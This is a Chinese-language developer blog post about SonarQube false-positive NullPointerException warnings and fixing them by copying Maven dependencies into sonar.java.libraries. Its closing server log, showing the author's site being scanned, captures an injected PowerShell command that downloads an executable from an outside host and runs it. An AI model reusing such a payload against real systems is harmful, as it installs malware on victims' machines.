+++
title = "Sonar扫描的NPE问题"
description = "Commons-lang StringUtils isNotBlank method still raise NPE"
tags = [
]
date = "2020-03-12"
topics = [
    "US"
]
+++

![](https://aws1.discourse-cdn.com/sonarsource/uploads/sscommunity/original/2X/3/318735b08e742b4bab065a9821caa48762a4c697.png)

直到我修改为这样的代码才通过——

```

public class DetectorImport {
    public String check1(Nonentity nonentity) {
        String s;
        if(nonentity == null) {
            s = null;
        }else {
            s = nonentity.getName();
        }
        if(s !=null) {
            s = s.replaceAll("（", "(");
        }
        return s;
    }
}

```

查到的几个相关问题——
[https://community.sonarsource.com/tags/c/bug/fp/7/java](https://community.sonarsource.com/tags/c/bug/fp/7/java)



[Sonarqube is raising false-positive NPE](https://community.sonarsource.com/t/sonarqube-is-raising-false-positive-npe/4515)

2019-07-19  

>I expect that nonNull implementation is in the another file than the main code. Unfortunately that’s the current limitation we have for this rule. If you move nonNull in the file, FP should disappear.
This problem can’t be fixed easily, so for now I suggest you to mark issue as FP in SonarQube UI.
Anyway thanks for reporting it.


[squid:S2259 : A “NullPointerException” could be thrown; “dc” is nullable here. While “dc” is checked as not null](https://community.sonarsource.com/t/squid-s2259-a-nullpointerexception-could-be-thrown-dc-is-nullable-here-while-dc-is-checked-as-not-null/2616)

[[JAVA] squid:S2259 False Positive with Utility methods](https://groups.google.com/forum/#!topic/sonarqube/aluTP63hfyA)
这里提到是支持apache commen的StringUtils包的。

> We currently support methods from commons-lang StringUtils ([v2](https://commons.apache.org/proper/commons-lang/javadocs/api-2.6/org/apache/commons/lang/StringUtils.html), and [v3](https://www.google.com/url?q=https%3A%2F%2Fcommons.apache.org%2Fproper%2Fcommons-lang%2Fapidocs%2Forg%2Fapache%2Fcommons%2Flang3%2FStringUtils.html&sa=D&sntz=1&usg=AFQjCNHiDHLeUkFJvzevRg_dwUkvTbt8nA)), guava [preconditions](https://google.github.io/guava/releases/snapshot/api/docs/com/google/common/base/Preconditions.html#checkNotNull-T-), and java 8 methods from java.util.Objects (nonNull, isNull, requireNonNull). As we know how these methods behave, we are able to correctly handle such call and discard similar FPs. Of course, I don't want to force you using such libraries to make the analyzer happy. :)

report this on Sonar Community: [Commons-lang StringUtils isNotBlank method still raise NPE](https://community.sonarsource.com/t/commons-lang-stringutils-isnotblank-method-still-raise-npe/21517)


有人遇到了相同的问题，官方猜测是没有正确的配置`sonar.java.libraries` 

SonarQube上的确提示——
```
Bytecode of dependencies was not provided for analysis of source files, you might end up with less precise results. Bytecode can be provided using sonar.java.libraries property.
```

手动验证，将commons-lang3-3.7.jar添加到`sonar.java.libraries`参数里，问题解决。

---

下一步需要处理的方式——

>added the target “dependency:copy-dependencies” as part of the maven execution. This copied all the dependencies to the right location, then I set the property “-Dsonar.java.libraries=target/dependency” in our case.

将项目的依赖都复制到固定的目录，然后将这个目录传递给`sonar.java.libraries`参数。

[dependency:copy-dependencies](http://maven.apache.org/plugins/maven-dependency-plugin/copy-dependencies-mojo.html)的官方用法。

理论上这样就可以解决这个问题，需要验证的是多模块的项目的依赖是否可以全部正确复制到正确的目录下。

--- 

理论依据由别人提出

>added the target “dependency:copy-dependencies” as part of the maven execution. This copied all the dependencies to the right location, then I set the property “-Dsonar.java.libraries=target/dependency” in our case.

我的实践如下——


这个插件的官方[maven-dependency-plugin 使用文档](http://maven.apache.org/plugins/maven-dependency-plugin/usage.html)，根据[样例](https://maven.apache.org/plugins/maven-dependency-plugin/examples/copying-project-dependencies.html)如下——

```
<plugin>
    <groupId>org.apache.maven.plugins</groupId>
    <artifactId>maven-dependency-plugin</artifactId>
    <version>3.1.2</version>
    <executions>
        <execution>
        <id>copy-dependencies</id>
        <phase>package</phase>
        <goals>
            <goal>copy-dependencies</goal>
        </goals>
        <configuration>
            <outputDirectory>${project.build.directory}/alternateLocation</outputDirectory>
            <overWriteReleases>false</overWriteReleases>
            <overWriteSnapshots>false</overWriteSnapshots>
            <overWriteIfNewer>true</overWriteIfNewer>
        </configuration>
        </execution>
    </executions>
</plugin>
```

这样有两个问题：  
- 在多模块下自定义的这个outputDirectory目录是相对目录，会将依赖的jar包复制到子模块对应的目录下；
- 根据这里的[解决方案](https://stackoverflow.com/a/7676673/1087122)使用变量`${session.executionRootDirectory}/target/`，可以强制将依赖包都复制到固定目录，但只能在执行 `mvn package`阶段才生效

这样导致执行了接近全生命周期的任务。

这里涉及到`phase`、`goal`的概念区别：[What are Maven goals and phases and what is their difference?](https://stackoverflow.com/questions/16205778/what-are-maven-goals-and-phases-and-what-is-their-difference)

>Life cycle is a sequence of named **phases**.  
>**Phases** executes sequentially. Executing a phase means executes all previous phases.

>**Plugin** is a collection of **goals** also called MOJO (**M**aven **O**ld **J**ava **O**bject).  
Analogy : Plugin is a class and goals are methods within the class.

[default Maven lifecycle bindings](http://maven.apache.org/guides/introduction/introduction-to-the-lifecycle.html#Built-in_Lifecycle_Bindings)这里定义了在各个“阶段”(phase)都会执行哪些“目标动作”(goals)

`mvn [plugin-name]:[goal-name] ` ，例如`mvn dependency:copy-dependencies`就是执行了插件`maven-dependency-plugin`定义的`copy-dependencies`动作。进一步，对应的configuration可以通过变量进行传参。

经验证，使用绝对路径地址指定outputDirectory的值是，可以将多模块的依赖统一复制到指定目录下。

所以，最终的**解决方案**为：

1. 直接执行goal，`mvn dependency:copy-dependencies -DoutputDirectory=absolute/path/to/lib/dir`将所有的依赖复制到指定目录，
2. 将上面的目录传递给sonar的`sonar.java.libraries`变量，例如 `-Dsonar.java.libraries=absolute/path/to/lib/dir/*.jar`


---



没想到我这小破站也被扫描了——
```
2020-03-09 13:48:49.794  INFO 2173 --- [p-nio-80-exec-3] org.apache.tomcat.util.http.Parameters   : Character decoding failed. Parameter [mail[#markup]] with value [ powershell (new-object System.Net.WebClient).DownloadFile('http://ero.bckl.ir/download.exe','%SystemRoot%/Temp/zjajlhxadgirori21058.exe');start %SystemRoot%/Temp/zjajlhxadgirori21058.exe] has been ignored. Note that the name and value quoted here may be corrupted due to the failed decoding. Use debug level logging to see the original, non-corrupted values.
 Note: further occurrences of Parameter errors will be logged at DEBUG level.
2020-03-10 03:44:19.910  INFO 2173 --- [p-nio-80-exec-7] o.apache.coyote.http11.Http11Processor   : Error parsing HTTP request header
 Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.

java.lang.IllegalArgumentException: Invalid character found in the HTTP protocol
	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:532) ~[tomcat-embed-core-9.0.21.jar!/:9.0.21]
	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:294) ~[tomcat-embed-core-9.0.21.jar!/:9.0.21]
	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66) [tomcat-embed-core-9.0.21.jar!/:9.0.21]
	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:853) [tomcat-embed-core-9.0.21.jar!/:9.0.21]
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1587) [tomcat-embed-core-9.0.21.jar!/:9.0.21]
	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.21.jar!/:9.0.21]
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_232]
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [na:1.8.0_232]
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.21.jar!/:9.0.21]
	at java.lang.Thread.run(Thread.java:748) [na:1.8.0_232]

```

